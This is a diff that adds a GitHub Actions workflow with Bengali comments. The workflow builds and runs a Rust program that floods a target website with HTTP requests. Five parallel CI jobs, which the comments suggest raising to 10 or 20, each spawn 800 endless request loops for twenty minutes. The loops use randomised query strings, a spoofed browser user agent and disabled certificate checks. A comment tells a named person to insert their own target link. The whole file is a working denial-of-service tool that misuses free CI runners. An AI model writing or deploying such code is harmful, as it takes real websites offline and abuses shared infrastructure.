@@ -1,0 +1,81 @@
+name: Vortex Matrix Stealth v9
+on: 
+  workflow_dispatch:
+
+jobs:
+  vortex-stealth:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        instance: [1, 2, 3, 4, 5] # এখান থেকে পাওয়ার বাড়াতে পারো (১০ বা ২০ করতে পারো)
+
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v3
+
+      - name: Setup Stealth Engine
+        run: |
+          cargo new vortex_stealth --bin
+          cd vortex_stealth
+          
+          # Cargo.toml কনফিগারেশন
+          echo '[package]
+          name = "vortex_stealth"
+          version = "0.1.0"
+          edition = "2021"
+          [dependencies]
+          tokio = { version = "1", features = ["full"] }
+          reqwest = { version = "0.11", features = ["rustls-tls", "json"] }
+          rand = "0.8"' > Cargo.toml
+          
+          # মেইন রাস্ট কোড (Stealth & Status Monitor)
+          echo 'use reqwest::{Client, header};
+          use std::time::Duration;
+
+          #[tokio::main]
+          async fn main() {
+              let target = "https://myaura.xyz/"; // সমীর, এখানে তোমার লিংক দাও
+              
+              let mut headers = header::HeaderMap::new();
+              headers.insert(header::USER_AGENT, header::HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"));
+              headers.insert(header::ACCEPT_LANGUAGE, header::HeaderValue::from_static("en-US,en;q=0.9"));
+
+              let client = Client::builder()
+                  .default_headers(headers)
+                  .danger_accept_invalid_certs(true)
+                  .use_rustls_tls()
+                  .timeout(Duration::from_secs(5))
+                  .build().unwrap();
+
+              println!("🕵️ Machine ${{ matrix.instance }} is Active!");
+
+              let mut handles = vec![];
+              for i in 0..800 {
+                  let client_ref = client.clone();
+                  let target_ref = target.to_string();
+                  
+                  handles.push(tokio::spawn(async move {
+                      loop {
+                          let r: u32 = rand::random();
+                          let url = format!("{}?vortex={}", target_ref, r);
+                          
+                          match client_ref.get(&url).send().await {
+                              Ok(resp) => {
+                                  if i == 0 { // শুধু প্রথম থ্রেডের স্ট্যাটাস প্রিন্ট করবে
+                                      println!("📡 Status Code: {}", resp.status());
+                                  }
+                              }
+                              Err(_) => {
+                                  tokio::time::sleep(Duration::from_millis(10)).await;
+                              }
+                          }
+                      }
+                  }));
+              }
+              // ২০ মিনিট পর অটো-স্টপ
+              tokio::time::sleep(Duration::from_secs(1200)).await;
+          }' > src/main.rs
+
+          # কম্পাইল ও হাই-স্পিড রান
+          cargo run --release
